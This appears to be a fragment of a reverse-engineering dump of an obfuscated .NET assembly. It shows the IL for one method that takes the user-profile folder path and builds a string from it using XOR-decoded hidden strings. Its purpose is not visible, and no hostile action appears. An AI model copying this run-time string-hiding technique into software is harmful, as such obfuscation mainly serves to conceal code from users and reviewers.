# token=060028BF rva=205200 name=ExecuteFormatter source=dump_full grp=gfp
# {'ilsize': 123, 'maxstack': 9, 'eh': 0}
  IL_0000  ldc.i4.s 0x28
  IL_0002  call 0xa000159   ; MemberRef:System.Environment::GetFolderPath
  IL_0007  stloc.s 0x1
  IL_0009  br IL_000e
  IL_000E  ldc.i4.1
  IL_000F  newarr 0x100000a   ; TypeRef:System.String
  IL_0014  dup
  IL_0015  ldc.i4.0
  IL_0016  ldloc.s 0x1
  IL_0018  ldc.i4 0xbb35c016
  IL_001D  ldc.i4 0xd2df7de1
  IL_0022  xor
  IL_0023  ldsfld 0x40020b8   ; Field:20B8
  IL_0028  ldfld 0x400208f   ; Field:208F
  IL_002D  xor
  IL_002E  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_0033  ldc.i4 0xe257d831
  IL_0038  ldc.i4 0xaf075353
  IL_003D  sub
  IL_003E  ldc.i4 0x13959869
  IL_0043  xor
  IL_0044  ldsfld 0x40020b8   ; Field:20B8
  IL_0049  ldfld 0x40020d5   ; Field:20D5
  IL_004E  xor
  IL_004F  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_0054  ldc.i4 0x5c81b045
  IL_0059  ldc.i4 0x330092ff
  IL_005E  xor
  IL_005F  ldsfld 0x40020b8   ; Field:20B8
  IL_0064  ldfld 0x40020b5   ; Field:20B5
  IL_0069  xor
  IL_006A  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_006F  ldsfld 0x4002785   ; Field:2785
  IL_0074  call 0x6005fac   ; MethodDef:ExecuteExplorer
  IL_0079  stelem.ref
  IL_007A  ret
